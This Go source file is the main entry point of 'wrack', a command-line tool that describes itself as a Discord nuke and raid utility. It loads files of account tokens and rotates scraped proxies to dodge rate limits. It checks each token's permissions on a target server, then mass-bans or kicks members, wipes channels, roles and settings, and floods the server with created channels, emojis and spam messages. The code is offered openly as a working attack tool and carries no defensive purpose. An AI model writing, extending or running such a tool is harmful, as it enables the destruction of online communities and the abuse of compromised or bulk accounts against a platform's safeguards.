// wrack — Discord nuke/raid CLI. Multi-token, proxy-rotated, rate-limit-aware.
package main

import (
	"context"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"

	"github.com/M1noa/wrack/api"
	"github.com/M1noa/wrack/nuke"
	"github.com/M1noa/wrack/payload"
	"github.com/M1noa/wrack/perms"
	"github.com/M1noa/wrack/proxy"
	"github.com/M1noa/wrack/raid"
	"github.com/M1noa/wrack/recon"
	"github.com/M1noa/wrack/token"
	"github.com/M1noa/wrack/ui"
)

const version = "0.1.0"
const toolName = "wrack"

func main() {
	var (
		guildID     = flag.String("guild", "", "target guild ID (required)")
		tokenFile   = flag.String("tokens", "tokens.txt", "file with one token per line")
		threads     = flag.Int("threads", 15, "worker threads")
		mode        = flag.String("mode", "nuke", "nuke|raid|message-only")
		messageFile = flag.String("message", "", "discohook JSON file (Options→JSON Editor→Download→Plain JSON)")
		short       = flag.String("short", toolName, "short name used for channels/roles/webhooks/tag/bio/rules")
		imageFile   = flag.String("image", "", "image file for server pfp + emojis + stickers (optional)")
		proxyFile   = flag.String("proxy-file", "", "custom proxy list file (one per line)")
		proxyType   = flag.String("proxy-type", "http", "http|socks4|socks5 (for --proxy-file)")
		noProxy     = flag.Bool("no-proxy", false, "disable proxies entirely")
		noProxyTest = flag.Bool("no-proxy-test", false, "skip startup proxy validation")
		proxyMs     = flag.Int("proxy-ms", 80, "max proxy latency in ms")
		noWebhook   = flag.Bool("no-webhook", false, "force-disable webhooks")
		forceHook   = flag.Bool("force-webhook", false, "only use webhooks (error if impossible)")
		maxChannels = flag.Int("max-channels", 0, "cap on created channels (0 = until Discord limit)")
		maxRoles    = flag.Int("max-roles", 0, "cap on created roles (0 = 250)")
		maxEmojis   = flag.Int("max-emojis", 0, "cap on created emojis (0 = guild cap)")
		maxStickers = flag.Int("max-stickers", 0, "cap on created stickers (0 = guild cap)")
		maxSounds   = flag.Int("max-sounds", 0, "cap on created sounds (0 = guild cap)")
		noBan       = flag.Bool("no-ban", false, "skip banning members")
		kickInstead = flag.Bool("kick", false, "kick instead of ban")
		deleteSecs  = flag.Int("delete-msgs-secs", 604800, "ban message-deletion window (max 604800)")
		ignoreErrs  = flag.Bool("ignore-errors", false, "run even if some tokens fail audit")
		nsfwChans   = flag.Bool("nsfw", true, "set nsfw=true on created channels (raid mode)")
		showVer     = flag.Bool("version", false, "print version and exit")
		yes         = flag.Bool("y", false, "assume yes (skip confirmation)")
		longYes     = flag.Bool("yes", false, "alias for -y")
	)
	flag.Parse()
	if *showVer {
		fmt.Println(toolName, version)
		return
	}
	skipConfirm := *yes || *longYes

	ui.Banner(strings.ToUpper(toolName))
	accent := ui.PickAccent()
	ui.Dim("%s v%s\n", toolName, version)

	if *guildID == "" {
		ui.Err("--guild is required")
		flag.Usage()
		os.Exit(2)
	}
	if *mode != "nuke" && *mode != "raid" && *mode != "message-only" {
		ui.Err("--mode must be nuke|raid|message-only")
		os.Exit(2)
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
	go func() { <-sig; cancel() }()

	// ---- tokens ----
	raws, err := loadTokens(*tokenFile)
	must(err, "load tokens")
	ui.Info("tokens: %d loaded", len(raws))

	// ---- proxies ----
	var pool *proxy.Pool
	totalCandidates := 0
	if !*noProxy {
		var candidates map[string]string
		if *proxyFile != "" {
			b, err := os.ReadFile(*proxyFile)
			must(err, "read proxy file")
			candidates = proxy.BuildFromFile(string(b), *proxyType)
		} else {
			srcs, err := proxy.LoadEmbedded()
			must(err, "parse embedded sources")
			candidates, err = proxy.FetchAndParse(ctx, srcs.Flat(), http.DefaultClient)
			must(err, "scrape proxies")
		}
		totalCandidates = len(candidates)
		ui.Info("proxies: %d scraped candidates", totalCandidates)

		if *noProxyTest {
			pool = proxy.NewPool(makeProxies(candidates))
			ui.Warn("skipping proxy test (--no-proxy-test)")
		} else {
			live := proxy.Test(ctx, candidates, *proxyMs, *threads)
			pool = proxy.NewPool(live)
			ui.Ok("%s", proxy.Summary(pool, totalCandidates))
		}
		if pool.Len() == 0 {
			ui.Warn("no live proxies found; falling back to direct connection")
			pool = nil
		}
	}

	// ---- build clients ----
	newClient := func(raw string) *api.Client {
		if pool != nil {
			return api.NewClient(raw, poolRotator{pool})
		}
		return api.NewClient(raw, nil)
	}

	// ---- recon (read-only snapshot) ----
	probe := newClient(raws[0])
	if _, err := probe.Me(ctx); err != nil {
		ui.Err("first token failed auth: %v", err)
		os.Exit(1)
	}
	snap, warnings := recon.Take(ctx, probe, *guildID, true)
	for _, w := range warnings {
		ui.Dim("recon warn: %s", w)
	}
	if snap.Guild == nil {
		ui.Err("could not fetch guild %s", *guildID)
		os.Exit(1)
	}
	ui.Info("guild: %s (%d members)", snap.Guild.Name, snap.Guild.ApproxMemberCount)
	ui.Info("channels=%d roles=%d emojis=%d stickers=%d sounds=%d invites=%d automod=%d",
		len(snap.Channels), len(snap.Roles), len(snap.Emojis), len(snap.Stickers),
		len(snap.Sounds), len(snap.Invites), len(snap.AutoMod))

	// ---- audit all tokens ----
	rep := perms.Audit(ctx, raws, *guildID, snap.Roles, snap.Guild.OwnerID)
	rep.Print(toolName)
	if len(rep.Bad) > 0 && !*ignoreErrs {
		ui.Err("%d token(s) failed audit; fix them or pass --ignore-errors", len(rep.Bad))
		os.Exit(1)
	}
	if len(rep.OK) == 0 {
		ui.Err("no usable tokens remain; aborting")
		os.Exit(1)
	}
	tpool := token.NewPool(rep.OK)

	// ---- message payload ----
	var msg *payload.Message
	if *messageFile != "" {
		msg, err = payload.Load(*messageFile)
		must(err, "load message payload")
	} else if *mode == "raid" || *mode == "message-only" {
		msg = payload.DefaultRaidMessage(toolName, accent)
	}

	// ---- confirm ----
	if !skipConfirm {
		fmt.Println()
		ui.Info("mode:        \x1b[1m%s\x1b[0m", *mode)
		ui.Info("guild:       %s", snap.Guild.Name)
		ui.Info("tokens:      %d ok / %d bad", len(rep.OK), len(rep.Bad))
		ui.Info("webhooks:    %v", webhookMode(*noWebhook, *forceHook, rep.Webhook, rep.Mixed))
		ui.Info("proxies:     %v", poolSummary(pool))
		ui.Info("short:       %q", *short)
		if msg != nil {
			ui.Info("message:     %s", preview(msg))
		} else {
			ui.Info("message:     none (silent wipe)")
		}
		fmt.Println()
		if !ui.Confirm("\x1b[31mthis will destroy the server. proceed?\x1b[0m") {
			ui.Warn("aborted by user")
			return
		}
	}

	// ---- execute ----
	nEngine := nuke.New(&nuke.Config{
		GuildID:    *guildID,
		Ban:        !*noBan,
		Kick:       *kickInstead,
		DeleteSecs: *deleteSecs,
		SkipBans:   *noBan,
	}, tpool, snap)

	rCfg := &raid.Config{
		GuildID:     *guildID,
		Short:       *short,
		MaxChannels: *maxChannels,
		MaxRoles:    *maxRoles,
		MaxEmojis:   *maxEmojis,
		MaxStickers: *maxStickers,
		MaxSounds:   *maxSounds,
		NSFW:        *nsfwChans,
	}
	if *imageFile != "" {
		img, err := os.ReadFile(*imageFile)
		must(err, "read image file")
		rCfg.ImageData = img
	}
	rEngine := raid.New(rCfg, tpool, nEngine, msg)

	switch *mode {
	case "nuke":
		must(nEngine.Run(ctx), "nuke")
		nEngine.StripSettings(ctx)
		nEngine.SetShortMessage(ctx, *short)
	case "raid":
		must(nEngine.Run(ctx), "nuke phase of raid")
		nEngine.StripSettings(ctx)
		nEngine.SetShortMessage(ctx, *short)
		rEngine.Run(ctx)
	case "message-only":
		rEngine.MessagesOnly(ctx)
	}

	ui.Ok("done.")
}

// poolRotator adapts proxy.Pool to api.ProxyRotator.
type poolRotator struct{ p *proxy.Pool }

func (r poolRotator) Next() api.Proxy { return r.p.Next() }

func loadTokens(path string) ([]string, error) {
	b, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var out []string
	for _, line := range strings.Split(string(b), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		out = append(out, line)
	}
	return out, nil
}

func makeProxies(cands map[string]string) []*proxy.Proxy {
	out := make([]*proxy.Proxy, 0, len(cands))
	for key, proto := range cands {
		addr := key[strings.Index(key, "|")+1:]
		p := proxy.NewProxy(proto, addr)
		out = append(out, p)
	}
	return out
}

func webhookMode(noHook, forceHook, anyHook, mixed bool) string {
	switch {
	case noHook:
		return "disabled (--no-webhook)"
	case forceHook:
		return "forced (--force-webhook)"
	case anyHook && !mixed:
		return "all webhooks"
	case anyHook && mixed:
		return "mixed (webhook + normal)"
	default:
		return "normal messages only"
	}
}

func poolSummary(p *proxy.Pool) string {
	if p == nil {
		return "direct (no proxy)"
	}
	return fmt.Sprintf("%d live", p.Len())
}

func preview(m *payload.Message) string {
	if m.Content != "" {
		s := m.Content
		if len(s) > 80 {
			s = s[:77] + "..."
		}
		return s
	}
	if len(m.Embeds) > 0 {
		return "(embed payload)"
	}
	if len(m.Components) > 0 {
		return "(components v2 payload)"
	}
	return "(empty)"
}

func must(err error, what string) {
	if err != nil {
		ui.Err("%s: %v", what, err)
		os.Exit(1)
	}
}

var _ = sync.Mutex{}
